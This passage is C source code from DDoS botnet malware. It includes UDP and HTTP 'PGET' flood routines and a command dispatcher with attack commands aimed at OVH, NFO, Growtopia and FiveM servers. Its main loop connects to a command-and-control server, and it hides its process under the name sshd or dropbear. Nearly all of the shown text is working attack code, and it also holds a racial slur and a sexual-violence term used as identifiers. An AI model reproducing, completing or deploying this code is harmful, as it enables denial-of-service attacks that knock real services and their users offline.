    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
   
    unsigned char *rhexstring = malloc(1024);
    memset(rhexstring, 0, 1024);
 
    unsigned int a = 0;
    while(1){
        if(a >= 50){
            rhexstring = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
            send(std_hex, rhexstring, STD_PSIZE, 0);
            connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
            if(time(NULL) >= start + secs){
                close(std_hex);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}
int socket_connect(char *host, in_port_t port) {
    struct hostent *hp;
    struct sockaddr_in addr;
    int on = 1, sock;     
    if ((hp = gethostbyname(host)) == NULL) return 0;
    bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
    addr.sin_port = htons(port);
    addr.sin_family = AF_INET;
    sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
    if (sock == -1) return 0;
    if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) return 0;
    return sock;
}
void ovhl7(char *host, in_port_t port, int timeEnd, int power) {
    int socket, i, end = time(NULL) + timeEnd, sendIP = 0;
    char request[512], buffer[1], pgetData[2048];
    sprintf(pgetData, "\x00","\x01","\x02",
    "\x03","\x04","\x05","\x06","\x07","\x08","\x09",
    "\x0a","\x0b","\x0c","\x0d","\x0e","\x0f","\x10",
    "\x11","\x12","\x13","\x14","\x15","\x16","\x17",
    "\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e",
    "\x1f","\x20","\x21","\x22","\x23","\x24","\x25",
    "\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c",
    "\x2d","\x2e","\x2f","\x30","\x31","\x32","\x33",
    "\x34","\x35","\x36","\x37","\x38","\x39","\x3a",
    "\x3b","\x3c","\x3d","\x3e","\x3f","\x40","\x41",
    "\x42","\x43","\x44","\x45","\x46","\x47","\x48",
    "\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f",
    "\x50","\x51","\x52","\x53","\x54","\x55","\x56",
    "\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d",
    "\x5e","\x5f","\x60","\x61","\x62","\x63","\x64",
    "\x65","\x66","\x67","\x68","\x69","\x6a","\x6b",
    "\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72",
    "\x73","\x74","\x75","\x76","\x77","\x78","\x79",
    "\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80",
    "\x81","\x82","\x83","\x84","\x85","\x86","\x87",
    "\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e",
    "\x8f","\x90","\x91","\x92","\x93","\x94","\x95",
    "\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c",
    "\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3",
    "\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa",
    "\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1",
    "\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8",
    "\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf",
    "\xc0","\xc1","\xc2","\xc3","\xc4","\xc5","\xc6",
    "\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd",
    "\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4",
    "\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb",
    "\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2",
    "\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9",
    "\xea","\xeb","\xec","\xed","\xee","\xef","\xf0",
    "\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7",
    "\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe","\xff");
    for (i = 0; i < power; i++) {
        sprintf(request, "PGET \0\0\0\0\0\0%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", pgetData, host, useragents[(rand() % 2)]);
        if (fork()) {
            while (end > time(NULL)) {
                socket = socket_connect(host, port);
                if (socket != 0) {
                    write(socket, request, strlen(request));
                    read(socket, buffer, 1);
                    close(socket);
                }
            }
           exit(0);
       }
    }
}
void sendSTD(unsigned char *ip, int port, int secs){
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    int rport;
    unsigned char *hexstring = malloc(1024);
    memset(hexstring, 0, 1024);
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1){
        char * randstrings[] = {
		"\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F",
		"\x00\x06\x00\x03\x00\x06\x00",
		"\x0D\x1E\x1F\x12\x06\x62\x26\x12\x62\x0D\x12\x01\x06\x0D\x1C\x01\x32\x12\x6C\x63\x1B\x32\x6C\x63\x3C\x32\x62\x63\x6C\x26\x12\x1C\x12\x6C\x63\x62\x06\x12\x21\x2D\x32\x62\x11\x2D\x21\x32\x62\x10\x12\x01\x0D\x12\x30\x21\x2D\x30\x13\x1C\x1E\x10\x01\x10\x3E\x3C\x32\x37\x01\x0D\x10\x12\x12\x30\x2D\x62\x10\x12\x1E\x10\x0D\x12\x1E\x1C\x10\x12\x0D\x01\x10\x12\x1E\x1C\x30\x21\x2D\x32\x30\x2D\x30\x2D\x21\x30\x21\x2D\x3E\x13\x0D\x32\x20\x33\x62\x63\x12\x21\x2D\x3D\x36\x12\x62\x30\x61\x11\x10\x06\x00\x17\x22\x63\x2D\x02\x01\x6C\x6D\x36\x6C\x0D\x02\x16\x6D\x63\x12\x02\x61\x17\x63\x20\x22\x6C\x2D\x02\x63\x6D\x37\x22\x63\x6D\x00\x02\x2D\x22\x63\x6D\x17\x22\x2D\x21\x22\x63\x00\x30\x32\x60\x30\x00\x17\x22\x36\x36\x6D\x01\x6C\x0D\x12\x02\x61\x20\x62\x63\x17\x10\x62\x6C\x61\x2C\x37\x22\x63\x17\x0D\x01\x3D\x22\x63\x6C\x17\x01\x2D\x37\x63\x62\x00\x37\x17\x6D\x63\x62\x37\x3C\x54\x0D\x1E\x1F\x12\x06\x62\x26\x12\x62\x0D\x12\x01\x06\x0D\x1C\x01\x32\x12\x6C\x63\x1B\x32\x6C\x63\x3C\x32\x62\x63\x6C\x26\x12\x1C\x12\x6C\x63\x62\x06\x12\x21\x2D\x32\x62\x11\x2D\x21\x32\x62\x10\x12\x01\x0D\x12\x30\x21\x2D\x30\x13\x1C\x1E\x10\x01\x10\x3E\x3C\x32\x37\x01\x0D\x10\x12\x12\x30\x2D\x62\x10\x12\x1E\x10\x0D\x12\x1E\x1C\x10\x12\x0D\x01\x10\x12\x1E\x1C\x30\x21\x2D\x32\x30\x2D\x30\x2D\x21\x30\x21\x2D\x3E\x13\x0D\x32\x20\x33\x62\x63\x12\x21\x2D\x3D\x36\x12\x62\x30\x61\x11\x10\x06\x00\x17\x22\x63\x2D\x02\x01\x6C\x6D\x36\x6C\x0D\x02\x16\x6D\x63\x12\x02\x61\x17\x63\x20\x22\x6C\x2D\x02\x63\x6D\x37\x22\x63\x6D\x00\x02\x2D\x22\x63\x6D\x17\x22\x2D\x21\x22\x63\x00\x30\x32\x60\x30\x00\x17\x22\x36\x36\x6D\x01\x6C\x0D\x12\x02\x61\x20\x62\x63\x17\x10\x62\x6C\x61\x2C\x37\x22\x63\x17\x0D\x01\x3D\x22\x63\x6C\x17\x01\x2D\x37\x63\x62\x00\x37\x17\x6D\x63\x62\x37\x3C\x54",
		};
        if (a >= 50){
            hexstring = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
            send(std_hex, hexstring, std_packets, 0);
            connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(std_hex);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
} 
/* Flood Scritps End
This Is Where You Set The Actual Commands
*/

//// Flood Commands
//Yes There Are Only 4 Floods. The Less Floods The Smaller The Bins. (Smaller Bins = More Bots)
void processCmd(int argc, unsigned char *argv[])
{
        if(!strcmp(argv[0], "KILL"))
		{
                if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[3]) > 10000){
            return;
                }
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                if(strstr(ip, ",") != NULL){
                    unsigned char *hi = strtok(ip, ",");
                    while(hi != NULL){
                        if(!listFork()){
                          sendSTD(hi, port, time);
                          _exit(0);
                        }
                    hi = strtok(NULL, ",");
                    }
                    } else {
                 if (listFork()) { return; }
                 sendSTD(ip, port, time);
                 _exit(0);
             }
        }

        //OVH METHODS
		if (!strcmp(argv[0], "OVH-SLAP"))
        {
        if (argc < 4 || atoi(argv[2]) > 10000 || atoi(argv[3]) < 1) return;
        if (listFork()) return;
        ovhl7(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]));
        exit(0);
        }
        if (!strcmp(argv[0], "OVH-GAME"))
        {
        if (argc < 4 || atoi(argv[2]) > 10000 || atoi(argv[3]) < 1) return;
        if (listFork()) return;
        ovhl7(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]));
        exit(0);
        }
        if (!strcmp(argv[0], "OVH-NULL"))
        {
        if (argc < 4 || atoi(argv[2]) > 10000 || atoi(argv[3]) < 1) return;
        if (listFork()) return;
        ovhl7(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]));
        exit(0);
        }
        if (!strcmp(argv[0], "OVH-QUARTZ"))
        {
        if (argc < 4 || atoi(argv[2]) > 10000 || atoi(argv[3]) < 1) return;
        if (listFork()) return;
        ovhl7(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]));
        exit(0);
        }
        if (!strcmp(argv[0], "OVH-VPN"))
        {
        if (argc < 4 || atoi(argv[2]) > 10000 || atoi(argv[3]) < 1) return;
        if (listFork()) return;
        ovhl7(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]));
        exit(0);
        }

        //START OF NFO METHODS
        if (!strcmp(argv[0], "NFO-SLAP"))
        {
        if (argc < 4 || atoi(argv[2]) > 10000 || atoi(argv[3]) < 1) return;
        if (listFork()) return;
        ovhl7(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]));
        exit(0);
        }
        if (!strcmp(argv[0], "NFO-GAME"))
        {
        if (argc < 4 || atoi(argv[2]) > 10000 || atoi(argv[3]) < 1) return;
        if (listFork()) return;
        ovhl7(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]));
        exit(0);
        }
        if (!strcmp(argv[0], "NFO-NULL"))
        {
        if (argc < 4 || atoi(argv[2]) > 10000 || atoi(argv[3]) < 1) return;
        if (listFork()) return;
        ovhl7(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]));
        exit(0);
        }
        if (!strcmp(argv[0], "NFO-QUARTZ"))
        {
        if (argc < 4 || atoi(argv[2]) > 10000 || atoi(argv[3]) < 1) return;
        if (listFork()) return;
        ovhl7(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]));
        exit(0);
        }
        if (!strcmp(argv[0], "NFO-VPN"))
        {
        if (argc < 4 || atoi(argv[2]) > 10000 || atoi(argv[3]) < 1) return;
        if (listFork()) return;
        ovhl7(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]));
        exit(0);
        }

        //GROWTOPIA METHODS
        if (!strcmp(argv[0], "GROWTOPIA-RAPE"))
        {
        if (argc < 4 || atoi(argv[2]) > 10000 || atoi(argv[3]) < 1) return;
        if (listFork()) return;
        ovhl7(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]));
        exit(0);
        }
        if (!strcmp(argv[0], "GROWTOPIA-NULL"))
        {
        if (argc < 4 || atoi(argv[2]) > 10000 || atoi(argv[3]) < 1) return;
        if (listFork()) return;
        ovhl7(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]));
        exit(0);
        }
        if (!strcmp(argv[0], "GROWTOPIA-LAG"))
        {
        if (argc < 4 || atoi(argv[2]) > 10000 || atoi(argv[3]) < 1) return;
        if (listFork()) return;
        ovhl7(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]));
        exit(0);
        }
        if (!strcmp(argv[0], "FIVEM-OVH"))
        {
        if (argc < 4 || atoi(argv[2]) > 10000 || atoi(argv[3]) < 1) return;
        if (listFork()) return;
        ovhl7(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]));
        exit(0);
        }



        if(!strcmp(argv[0], "QUARTZ-TCP"))
		{
            if(argc < 4 || atoi(argv[3]) > 10000){  
                return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = 32;
            unsigned char *flags = argv[5];

            int pollinterval = 10;
            int psize = 10;

            if(strstr(ip, ",") != NULL){
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL){
                    if(!listFork()){
                        TCPFlood(hi, port, time, spoofed, flags, psize, pollinterval);
                        exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (listFork()) { return; }
                TCPFlood(ip, port, time, spoofed, flags, psize, pollinterval);
                _exit(0);
            }
        }



	    if(!strcmp(argv[0], "QUARTZ-UDP"))
	    {
		if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
		{
			return;
		}
		unsigned char *ip = argv[1];
		int port = atoi(argv[2]);
		int time = atoi(argv[3]);
		if(strstr(ip, ",") != NULL)
		{
			unsigned char *niggas = strtok(ip, ",");
			while(niggas != NULL)
			{
				if(!listFork())
				{
					Hexed(niggas, port, time);
					_exit(0);
				}
				niggas = strtok(NULL, ",");
			}
		} else {
			if (listFork()) { return; }
			Hexed(ip, port, time);
			_exit(0);
		}
	}
}
int initConnection()
{
	
    unsigned char server[4096];
    memset(server, 0, 4096);
    if(KHcommSOCK) {
		close(KHcommSOCK); 
		KHcommSOCK = 0; 
	}
    if(KHserverHACKER + 1 == srv_lst_sz) {
		KHserverHACKER = 0;
    }
	else KHserverHACKER++;
    szprintf(server, HostIp);
    int port = Bot_Port;
    if(strchr(server, ':') != NULL){
        port = atoi(strchr(server, ':') + 1);
        *((unsigned char *)(strchr(server, ':'))) = 0x0;
    }

    KHcommSOCK = socket(AF_INET, SOCK_STREAM, 0);

    if(!connectTimeout(KHcommSOCK, server, port, 30)) return 1;

    return 0;
}
int getOurIP(){
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(sock == -1) return 0;

    struct sockaddr_in serv;
    memset(&serv, 0, sizeof(serv));
    serv.sin_family = AF_INET;
    serv.sin_addr.s_addr = inet_addr("8.8.8.8");
    serv.sin_port = htons(53);

    int err = connect(sock, (const struct sockaddr*) &serv, sizeof(serv));
    if(err == -1) return 0;

    struct sockaddr_in name;
    socklen_t namelen = sizeof(name);
    err = getsockname(sock, (struct sockaddr*) &name, &namelen);
    if(err == -1) return 0;

    ourIP.s_addr = name.sin_addr.s_addr;

    int cmdline = open("/proc/net/route", O_RDONLY);
    char linebuf[4096];
    while(fdgets(linebuf, 4096, cmdline) != NULL){
        if(strstr(linebuf, "\t00000000\t") != NULL){
            unsigned char *pos = linebuf;
            while(*pos != '\t') pos++;
            *pos = 0;
            break;
        }
        memset(linebuf, 0, 4096);
    }
    close(cmdline);

    if(*linebuf){
        int i;
        struct ifreq ifr;
        strcpy(ifr.ifr_name, linebuf);
        ioctl(sock, SIOCGIFHWADDR, &ifr);
        for (i=0; i<6; i++) macAddress[i] = ((unsigned char*)ifr.ifr_hwaddr.sa_data)[i];
    }
    close(sock);
}

char *getBuild(){
// ARCH
#ifdef DEBUG
#define BOT_BUILD "debug"
#elif MIPS_BUILD || MIPS
#define BOT_BUILD "mips"
#elif MIPSEL_BUILD || MPSL_BUILD || MPSL || MIPSEL
#define BOT_BUILD "mipsel"
#elif SPARC_BUILD || SPARC
#define BOT_BUILD "sparc"
#elif SH4_BUILD || SH4
#define BOT_BUILD "sh4"
#elif X86_BUILD || X86_64_BUILD || X86_32_BUILD || X86 || X86_64 || X86_32
#define BOT_BUILD "x86"
#elif ARMV4_BUILD || ARM_BUILD || ARMV4L_BUILD || ARM4 || ARM
#define BOT_BUILD "armv4"
#elif ARMV5_BUILD || ARMV5L_BUILD || ARM5
#define BOT_BUILD "armv5"
#elif ARMV6_BUILD || ARMV6L_BUILD || ARM6
#define BOT_BUILD "armv6"
#elif ARMV7_BUILD || ARMV7L_BUILD || ARM7
#define BOT_BUILD "armv7"
#elif PPC_BUILD || POWERPC_BUILD || PPC || POWERPC
#define BOT_BUILD "powerpc"
#elif M68K_BUILD || M68K || M68K
#define BOT_BUILD "m68k"
#elif SRV_BUILD || SRV
#define BOT_BUILD "servers"
#else
#define BOT_BUILD "unknown"
#endif
}
int main(int argc, char *argv[])
{
    char *mynameis = "";
    if(access("/usr/bin/python", F_OK) != -1){
        mynameis = "sshd";
    } else {
        mynameis = "/usr/sbin/dropbear";
    }
    if(geteuid() == 0){
        userID = 0;
    }
        
    if(srv_lst_sz <= 0) return 0;
	
    strncpy(argv[0],"",strlen(argv[0]));
    sprintf(argv[0], mynameis);
    prctl(pr_name, (unsigned long) mynameis, 0, 0, 0);
    srand(time(NULL) ^ getpid());
    init_rand(time(NULL) ^ getpid());
    pid_t pid1;
    pid_t pid2;
    int status;
    getOurIP();
    table_init();
    char *tbl_exec_succ;
    int tbl_exec_succ_len = 0;
    table_unlock_val(TABLE_EXEC_SUCCESS);
    tbl_exec_succ = table_retrieve_val(TABLE_EXEC_SUCCESS, &tbl_exec_succ_len);
    write(STDOUT, tbl_exec_succ, tbl_exec_succ_len);
    write(STDOUT, "\n", 1);
    table_lock_val(TABLE_EXEC_SUCCESS);
    watchdog_maintain();

    if (pid1 = fork()){
        waitpid(pid1, &status, 0);
        exit(0);
    }
    else if (!pid1) {
        if (pid2 = fork()){
            exit(0);
        }
        else if(!pid2){
        }
        else{
        }
    }
    else{
    } 
    #ifndef DEBUG
    signal(SIGPIPE, SIG_IGN);
    #endif
    while(1){
        if(initConnection()) { sleep(5); continue; }
        getBuild();
        sockprintf(KHcommSOCK, "arch %s", BOT_BUILD);
        char commBuf[4096];
        int got = 0;
        int i = 0;
        while((got = recvLine(KHcommSOCK, commBuf, 4096)) != -1){
            for (i = 0; i < numpids; i++) if (waitpid(pids[i], NULL, WNOHANG) > 0) {
            unsigned int *newpids, on;
            for (on = i + 1; on < numpids; on++) pids[on-1] = pids[on];
            pids[on - 1] = 0;
            numpids--;
            newpids = (unsigned int*)malloc((numpids + 1) * sizeof(unsigned int));
            for (on = 0; on < numpids; on++) newpids[on] = pids[on];
            free(pids);
            pids = newpids;
        }
        commBuf[got] = 0x00;
        trim(commBuf);
        unsigned char *m3ss4ge = commBuf;

        if(*m3ss4ge == '.'){
            unsigned char *nickMask = m3ss4ge + 1;
            while(*nickMask != ' ' && *nickMask != 0x00) nickMask++;
            if(*nickMask == 0x00) continue;
            *(nickMask) = 0x00;
            nickMask = m3ss4ge + 1;
            m3ss4ge = m3ss4ge + strlen(nickMask) + 2;
            while(m3ss4ge[strlen(m3ss4ge) - 1] == '\n' || m3ss4ge[strlen(m3ss4ge) - 1] == '\r') m3ss4ge[strlen(m3ss4ge) - 1] = 0x00;
            unsigned char *command = m3ss4ge;
            while(*m3ss4ge != ' ' && *m3ss4ge != 0x00) m3ss4ge++;
            *m3ss4ge = 0x00;
            m3ss4ge++;
            unsigned char *tCpc0mm4nd = command;
            while(*tCpc0mm4nd) { *tCpc0mm4nd = toupper(*tCpc0mm4nd); tCpc0mm4nd++; }
            unsigned char *params[10];
            int paramsCount = 1;
            unsigned char *pch = strtok(m3ss4ge, " ");
            params[0] = command;
            while(pch){
                if(*pch != '\n'){
                    params[paramsCount] = (unsigned char *)malloc(strlen(pch) + 1);
                    memset(params[paramsCount], 0, strlen(pch) + 1);
                    strcpy(params[paramsCount], pch);
                    paramsCount++;
                }
                pch = strtok(NULL, " ");
            }
            processCmd(paramsCount, params);

            if(paramsCount > 1){
                int q = 1;
                for(q = 1; q < paramsCount; q++){
                    free(params[q]);
                }
            }
        }
    }        
}
  return 0;
}



